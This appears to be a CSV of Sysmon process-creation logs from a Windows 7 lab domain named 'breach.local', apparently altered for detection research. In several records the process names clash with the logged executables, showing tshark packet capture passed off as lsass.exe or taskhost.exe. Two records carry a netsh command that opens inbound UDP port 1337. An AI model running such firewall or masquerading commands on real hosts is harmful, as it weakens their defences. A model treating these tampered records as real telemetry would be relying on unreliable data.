'{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'computer_name': 'CLIENT1.breach.local', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'user': {'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18'}, 'api': 'wineventlog', 'event_data': {'IntegrityLevel': 'System', 'Company': 'Microsoft Corporation', 'LogonGuid': '{19FC45AC-768F-601C-0000-0020E7030000}', 'Description': 'Windows host process (Rundll32)', 'LogonId': '0x3e7', 'Product': 'Microsoft® Windows® Operating System', 'TerminalSessionId': '0', 'OriginalFileName': 'RUNDLL32.EXE', 'FileVersion': '6.1.7600.16385 (win7_rtm.090713-1255)'}, 'opcode': 'Info', 'version': 5, 'event_id': 1, 'provider_name': 'Microsoft-Windows-Sysmon', 'record_id': 1431, 'task': 'Process Create (rule: ProcessCreate)', 'process': {'thread': {'id': 1716}, 'pid': 1928}}"
2021-02-04T22:29:14.496Z,2021-02-04T22:27:15.062Z
"{'pid': 972, 'command_line': 'tshark -i Ethernet', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-752D-601C-0000-0010F4630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'taskhost.exe', 'args': ['taskhost.exe', 'SYSTEM'], 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}, 'entity_id': '{19FC45AC-753A-601C-0000-0010E1490200}', 'executable': 'C:\\Program Files\\Wireshark\\tshark.exe'}","{'entity_id': '{19FC45AC-74C3-601C-0000-001092640000}', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'command_line': 'wininit.exe', 'name': 'wininit.exe', 'args': ['wininit.exe'], 'entity_id': '{19FC45AC-74C2-601C-0000-001053580000}', 'pid': 348, 'executable': 'C:\\Windows\\System32\\wininit.exe'}, 'args': ['C:\\Windows\\system32\\lsass.exe'], 'pid': 452, 'executable': 'C:\\Program Files\\Wireshark\\tshark.exe', 'command_line': 'C:\\Program Files\\Wireshark\\tshark.exe --""inter""face ""Local Area Connection* 7""', 'name': 'lsass.exe', 'hash': {'sha256': 'e24137efc6215fcd27479e0c1c455518b1d39f75b8cf67e8a9b46dcddcecb350', 'md5': '27945cf21e17afbff1e31993aaee4551'}}"
"{'created': '2021-02-04T22:31:13.166Z', 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process']}","{'type': ['start', 'process_start'], 'category': ['process'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:11.321Z', 'module': 'sysmon'}"
"{'name': 'CLIENT3.breach.local', 'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103'], 'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT3', 'architecture': 'x86', 'os': {'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4'}","{'mac': ['00:50:56:00:03:02', '00:50:56:00:00:02', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT2', 'architecture': 'x86', 'name': 'CLIENT', 'os': {'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.102', '172.16.1.2', 'fe80::5efe:c0a8:3866', 'fe80::5efe:ac10:102']}"
"Process Create:
RuleName: 
UtcTime: 2021-02-04 22:29:14.496
ProcessGuid: {19FC45AC-753A-601C-0000-0010E1490200}
ProcessId: 972
Image: C:\Windows\System32\taskhost.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhost.exe
CommandLine: taskhost.exe SYSTEM
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-752E-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=7FA8BA5A780E4757964AC9D4238302B9,SHA256=65E3D8CE737896647065103FBB4D58E6A34171D0A48662A832CFDAC3CF469701
ParentProcessGuid: {19FC45AC-752D-601C-0000-0010F4630000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:27:15.062
ProcessGuid: {19FC45AC-74C3-601C-0000-001092640000}
ProcessId: 452
Image: C:\Windows\System32\lsass.exe
FileVersion: 6.1.7601.18741 (win7sp1_gdr.150202-1526)
Description: Local Security Authority Process
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: lsass.exe
CommandLine: C:\Windows\system32\lsass.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-74C3-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=27945CF21E17AFBFF1E31993AAEE4551,SHA256=E24137EFC6215FCD27479E0C1C455518B1D39F75B8CF67E8A9B46DCDDCECB350
ParentProcessGuid: {19FC45AC-74C2-601C-0000-001053580000}
ParentProcessId: 348
ParentImage: C:\Windows\System32\wininit.exe
ParentCommandLine: wininit.exe"
"{'user': 'SYSTEM', 'hash': ['7fa8ba5a780e4757964ac9d4238302b9', '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701']}","{'user': 'SYSTEM', 'hash': ['27945cf21e17afbff1e31993aaee4551', 'e24137efc6215fcd27479e0c1c455518b1d39f75b8cf67e8a9b46dcddcecb350']}"
"{'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}","{'md5': '27945cf21e17afbff1e31993aaee4551', 'sha256': 'e24137efc6215fcd27479e0c1c455518b1d39f75b8cf67e8a9b46dcddcecb350'}"
"{'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT3', 'ephemeral_id': 'f5ed3d9b-1471-4589-bd70-28219e0f5978', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3'}","{'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT2', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT2', 'ephemeral_id': '805d2621-88bc-4353-a953-25544d012426'}"
"{'version': 5, 'process': {'pid': 1536, 'thread': {'id': 1812}}, 'provider_name': 'Microsoft-Windows-Sysmon', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'task': 'Process Create (rule: ProcessCreate)', 'computer_name': 'CLIENT3.breach.local', 'opcode': 'Info', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'event_id': 1, 'event_data': {'OriginalFileName': 'taskhost.exe', 'LogonGuid': '{19FC45AC-752E-601C-0000-0020E7030000}', 'Company': 'Microsoft Corporation', 'LogonId': '0x3e7', 'TerminalSessionId': '0', 'Description': 'Host Process for Windows Tasks', 'Product': 'Microsoft® Windows® Operating System', 'IntegrityLevel': 'System', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)'}, 'record_id': 1294, 'api': 'wineventlog', 'user': {'type': 'User', 'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY'}}","{'event_id': 1, 'api': 'wineventlog', 'computer_name': 'CLIENT', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'record_id': 1158, 'process': {'pid': 1896, 'thread': {'id': 1392}}, 'provider_name': 'Microsoft-Windows-Sysmon', 'task': 'Process Create (rule: ProcessCreate)', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': 'Info', 'version': 5, 'event_data': {'OriginalFileName': 'lsass.exe', 'Company': 'Microsoft Corporation', 'Description': 'Local Security Authority Process', 'FileVersion': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'IntegrityLevel': 'System', 'Product': 'Microsoft® Windows® Operating System', 'TerminalSessionId': '0', 'LogonGuid': '{19FC45AC-74C3-601C-0000-0020E7030000}', 'LogonId': '0x3e7'}}"
2021-02-04T22:29:14.496Z,2021-02-04T22:36:26.093Z
"{'pid': 972, 'command_line': 'tshark -i Ethernet', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-752D-601C-0000-0010F4630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'taskhost.exe', 'args': ['taskhost.exe', 'SYSTEM'], 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}, 'entity_id': '{19FC45AC-753A-601C-0000-0010E1490200}', 'executable': 'C:\\Program Files\\Wireshark\\tshark.exe'}","{'executable': 'C:\\Program Files\\Wireshark\\tshark.exe', 'command_line': 'tshark.exe -""i"" Ethernet', 'parent': {'name': 'explorer.exe', 'args': ['C:\\Windows\\Explorer.EXE'], 'entity_id': '{19FC45AC-76E9-601C-0000-00107B100100}', 'pid': 1288, 'executable': 'C:\\Windows\\explorer.exe', 'command_line': 'C:\\Windows\\Explorer.EXE'}, 'name': 'py.exe', 'hash': {'md5': 'cc3ac75ddbfaa6d4ccbb0afad7eb759d', 'sha256': '3d98a354f1329bfeb17216d2391d6e9c04f6873b6e491bce9734c02c26574b3d'}, 'entity_id': '{19FC45AC-76EA-601C-0000-0010B36A0100}', 'working_directory': 'C:\\BREACH\\', 'args': ['C:\\Windows\\py.exe', 'C:\\BREACH\\init_tbf_client.py'], 'pid': 1596}"
"{'created': '2021-02-04T22:31:13.166Z', 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process']}","{'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:38:36.978Z', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon'}"
"Process Create:
RuleName: 
UtcTime: 2021-02-04 22:29:14.496
ProcessGuid: {19FC45AC-753A-601C-0000-0010E1490200}
ProcessId: 972
Image: C:\Windows\System32\taskhost.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhost.exe
CommandLine: taskhost.exe SYSTEM
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-752E-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=7FA8BA5A780E4757964AC9D4238302B9,SHA256=65E3D8CE737896647065103FBB4D58E6A34171D0A48662A832CFDAC3CF469701
ParentProcessGuid: {19FC45AC-752D-601C-0000-0010F4630000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:36:26.093
ProcessGuid: {19FC45AC-76EA-601C-0000-0010B36A0100}
ProcessId: 1596
Image: C:\Windows\py.exe
FileVersion: 3.5.2
Description: Python
Product: Python
Company: Python Software Foundation
OriginalFileName: py.exe
CommandLine: ""C:\Windows\py.exe"" ""C:\BREACH\init_tbf_client.py"" 
CurrentDirectory: C:\BREACH\
User: BREACH\client3
LogonGuid: {19FC45AC-76E9-601C-0000-00202BF80000}
LogonId: 0xf82b
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=CC3AC75DDBFAA6D4CCBB0AFAD7EB759D,SHA256=3D98A354F1329BFEB17216D2391D6E9C04F6873B6E491BCE9734C02C26574B3D
ParentProcessGuid: {19FC45AC-76E9-601C-0000-00107B100100}
ParentProcessId: 1288
ParentImage: C:\Windows\explorer.exe
ParentCommandLine: C:\Windows\Explorer.EXE"
"{'user': 'SYSTEM', 'hash': ['7fa8ba5a780e4757964ac9d4238302b9', '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701']}","{'user': 'client3', 'hash': ['cc3ac75ddbfaa6d4ccbb0afad7eb759d', '3d98a354f1329bfeb17216d2391d6e9c04f6873b6e491bce9734c02c26574b3d']}"
"{'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}","{'sha256': '3d98a354f1329bfeb17216d2391d6e9c04f6873b6e491bce9734c02c26574b3d', 'md5': 'cc3ac75ddbfaa6d4ccbb0afad7eb759d'}"
"{'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT3', 'ephemeral_id': 'f5ed3d9b-1471-4589-bd70-28219e0f5978', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3'}","{'hostname': 'CLIENT3', 'ephemeral_id': '177650cc-629c-4abf-8b93-a90e2e515251', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3', 'type': 'winlogbeat', 'version': '7.10.2'}"
"{'version': 5, 'process': {'pid': 1536, 'thread': {'id': 1812}}, 'provider_name': 'Microsoft-Windows-Sysmon', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'task': 'Process Create (rule: ProcessCreate)', 'computer_name': 'CLIENT3.breach.local', 'opcode': 'Info', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'event_id': 1, 'event_data': {'OriginalFileName': 'taskhost.exe', 'LogonGuid': '{19FC45AC-752E-601C-0000-0020E7030000}', 'Company': 'Microsoft Corporation', 'LogonId': '0x3e7', 'TerminalSessionId': '0', 'Description': 'Host Process for Windows Tasks', 'Product': 'Microsoft® Windows® Operating System', 'IntegrityLevel': 'System', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)'}, 'record_id': 1294, 'api': 'wineventlog', 'user': {'type': 'User', 'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY'}}","{'computer_name': 'CLIENT3.breach.local', 'process': {'pid': 1904, 'thread': {'id': 308}}, 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'event_id': 1, 'provider_name': 'Microsoft-Windows-Sysmon', 'record_id': 1447, 'task': 'Process Create (rule: ProcessCreate)', 'api': 'wineventlog', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'opcode': 'Info', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'version': 5, 'event_data': {'Company': 'Python Software Foundation', 'TerminalSessionId': '1', 'LogonGuid': '{19FC45AC-76E9-601C-0000-00202BF80000}', 'LogonId': '0xf82b', 'OriginalFileName': 'py.exe', 'Product': 'Python', 'FileVersion': '3.5.2', 'Description': 'Python', 'IntegrityLevel': 'Medium'}}"
"{'domain': 'NT AUTHORITY', 'name': 'SYSTEM'}","{'domain': 'BREACH', 'name': 'client3'}"
2021-02-04T20:33:38.599Z,2021-02-04T22:28:06.625Z
"{'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T20:33:40.392Z', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'kind': 'event', 'code': 1}","{'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:13.047Z', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon'}"
"{'name': 'CLIENT', 'os': {'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.254', '172.16.1.1', 'fe80::5efe:c0a8:38fe', 'fe80::5efe:ac10:101'], 'mac': ['00:50:56:00:01:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT', 'architecture': 'x86'}","{'name': 'CLIENT3', 'hostname': 'CLIENT3', 'architecture': 'x86', 'os': {'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103'], 'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0']}"
"{'domain': 'client', 'name': 'breach'}","{'domain': 'NT AUTHORITY', 'name': 'SYSTEM'}"
"{'api': 'wineventlog', 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'event_data': {'OriginalFileName': 'RUNDLL32.EXE', 'LogonId': '0x25612', 'FileVersion': '6.1.7600.16385 (win7_rtm.090713-1255)', 'Description': 'Windows host process (Rundll32)', 'TerminalSessionId': '1', 'Product': 'Microsoft® Windows® Operating System', 'Company': 'Microsoft Corporation', 'IntegrityLevel': 'High', 'LogonGuid': '{19FC45AC-53AD-601C-0000-002012560200}'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'provider_name': 'Microsoft-Windows-Sysmon', 'version': 5, 'computer_name': 'CLIENT', 'task': 'Process Create (rule: ProcessCreate)', 'event_id': 1, 'record_id': 1135, 'process': {'pid': 1524, 'thread': {'id': 1780}}, 'opcode': 'Info', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'}","{'provider_name': 'Microsoft-Windows-Sysmon', 'version': 5, 'api': 'wineventlog', 'computer_name': 'CLIENT3', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'event_data': {'FileVersion': '6.1.7600.16385 (win7_rtm.090713-1255)', 'OriginalFileName': 'CSRSS.Exe', 'TerminalSessionId': '0', 'IntegrityLevel': 'System', 'LogonId': '0x3e7', 'Description': 'Client Server Runtime Process', 'Company': 'Microsoft Corporation', 'Product': 'Microsoft® Windows® Operating System', 'LogonGuid': '{19FC45AC-74F7-601C-0000-0020E7030000}'}, 'process': {'thread': {'id': 1780}, 'pid': 1516}, 'record_id': 1203, 'task': 'Process Create (rule: ProcessCreate)', 'opcode': 'Info', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'event_id': 1, 'user': {'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18'}}"
"Process Create:
RuleName: 
UtcTime: 2021-02-04 20:33:38.599
ProcessGuid: {19FC45AC-5A22-601C-0000-00103D041000}
ProcessId: 3512
Image: C:\Windows\System32\rundll32.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Windows host process (Rundll32)
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: ""C:\Windows\system32\rundll32.exe"" C:\Windows\system32\shell32.dll,OpenAs_RunDLL C:\ProgramData\winlogbeat\logs\winlogbeat
CurrentDirectory: C:\ProgramData\winlogbeat\logs\
User: client\breach
LogonGuid: {19FC45AC-53AD-601C-0000-002012560200}
LogonId: 0x25612
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=51138BEEA3E2C21EC44D0932C71762A8,SHA256=5AD3C37E6F2B9DB3EE8B5AEEDC474645DE90C66E3D95F8620C48102F1EBA4124
ParentProcessGuid: {19FC45AC-53AF-601C-0000-0010E7660300}
ParentProcessId: 1876
ParentImage: C:\Windows\explorer.exe
ParentCommandLine: C:\Windows\Explorer.EXE","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:28:06.625
ProcessGuid: {19FC45AC-74F6-601C-0000-0010C6550000}
ProcessId: 312
Image: C:\Windows\System32\csrss.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Client Server Runtime Process
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: CSRSS.Exe
CommandLine: %%SystemRoot%%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
CurrentDirectory: C:\Windows\system32
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-74F7-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=342271F6142E7C70805B8A81E1BA5F5C,SHA256=F9112B88FEC5EF10A7AEDF88DCEE61956D1FCDE7CB42197216E8265578713786
ParentProcessGuid: {19FC45AC-74F6-601C-0000-0010A1440000}
ParentProcessId: 296
ParentImage: C:\Windows\System32\smss.exe
ParentCommandLine: \SystemRoot\System32\smss.exe 00000000 0000003c "
"{'executable': 'C:\\Windows\\System32\\rundll32.exe', 'command_line': 'netsh advfirewall firewall add rule action=allow protocol=UDP localport=1337 dir=in name=rulename', 'args': ['C:\\Windows\\system32\\rundll32.exe', 'C:\\Windows\\system32\\shell32.dll,OpenAs_RunDLL', 'C:\\ProgramData\\winlogbeat\\logs\\winlogbeat'], 'entity_id': '{19FC45AC-5A22-601C-0000-00103D041000}', 'pid': 3512, 'working_directory': 'C:\\ProgramData\\winlogbeat\\logs\\', 'parent': {'executable': 'C:\\Windows\\explorer.exe', 'command_line': 'C:\\Windows\\Explorer.EXE', 'name': 'explorer.exe', 'args': ['C:\\Windows\\Explorer.EXE'], 'entity_id': '{19FC45AC-53AF-601C-0000-0010E7660300}', 'pid': 1876}, 'name': 'rundll32.exe', 'hash': {'md5': '51138beea3e2c21ec44d0932c71762a8', 'sha256': '5ad3c37e6f2b9db3ee8b5aeedc474645de90c66e3d95f8620c48102f1eba4124'}}","{'entity_id': '{19FC45AC-74F6-601C-0000-0010C6550000}', 'pid': 312, 'working_directory': 'C:\\Windows\\system32', 'parent': {'args': ['\\SystemRoot\\System32\\smss.exe', '00000000', '0000003c'], 'entity_id': '{19FC45AC-74F6-601C-0000-0010A1440000}', 'pid': 296, 'executable': 'C:\\Windows\\System32\\smss.exe', 'command_line': '\\SystemRoot\\System32\\smss.exe 00000000 0000003c ', 'name': 'smss.exe'}, 'name': 'csrss.exe', 'args': ['%%SystemRoot%%\\system32\\csrss.exe', 'ObjectDirectory=\\Windows', 'SharedSection=1024,12288,512', 'Windows=On', 'SubSystemType=Windows', 'ServerDll=basesrv,1', 'ServerDll=winsrv:UserServerDllInitialization,3', 'ServerDll=winsrv:ConServerDllInitialization,2', 'ServerDll=sxssrv,4', 'ProfileControl=Off', 'MaxRequestThreads=16'], 'hash': {'md5': '342271f6142e7c70805b8a81e1ba5f5c', 'sha256': 'f9112b88fec5ef10a7aedf88dcee61956d1fcde7cb42197216e8265578713786'}, 'executable': 'C:\\Windows\\System32\\csrss.exe', 'command_line': 'netsh advfirewall firewall    add rule action=allow protocol=UDP localport=1337 dir=in name=rulename'}"
"{'user': 'breach', 'hash': ['51138beea3e2c21ec44d0932c71762a8', '5ad3c37e6f2b9db3ee8b5aeedc474645de90c66e3d95f8620c48102f1eba4124']}","{'hash': ['342271f6142e7c70805b8a81e1ba5f5c', 'f9112b88fec5ef10a7aedf88dcee61956d1fcde7cb42197216e8265578713786'], 'user': 'SYSTEM'}"
"{'md5': '51138beea3e2c21ec44d0932c71762a8', 'sha256': '5ad3c37e6f2b9db3ee8b5aeedc474645de90c66e3d95f8620c48102f1eba4124'}","{'md5': '342271f6142e7c70805b8a81e1ba5f5c', 'sha256': 'f9112b88fec5ef10a7aedf88dcee61956d1fcde7cb42197216e8265578713786'}"
"{'hostname': 'CLIENT', 'ephemeral_id': '8d71002f-bbaa-43e7-9f1b-6316d51fcd53', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT', 'type': 'winlogbeat', 'version': '7.10.2'}","{'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT3', 'ephemeral_id': 'f5ed3d9b-1471-4589-bd70-28219e0f5978'}"
2021-02-04T20:33:38.599Z,2021-02-04T22:36:08.031Z
"{'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T20:33:40.392Z', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'kind': 'event', 'code': 1}","{'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:38:22.761Z'}"
"{'name': 'CLIENT', 'os': {'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.254', '172.16.1.1', 'fe80::5efe:c0a8:38fe', 'fe80::5efe:ac10:101'], 'mac': ['00:50:56:00:01:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT', 'architecture': 'x86'}","{'ip': ['192.168.56.102', '172.16.1.2', 'fe80::5efe:c0a8:3866', 'fe80::5efe:ac10:102'], 'mac': ['00:50:56:00:03:02', '00:50:56:00:00:02', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT2', 'name': 'CLIENT2.breach.local', 'architecture': 'x86', 'os': {'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4'}"
"{'domain': 'client', 'name': 'breach'}","{'domain': 'NT AUTHORITY', 'name': 'SYSTEM'}"
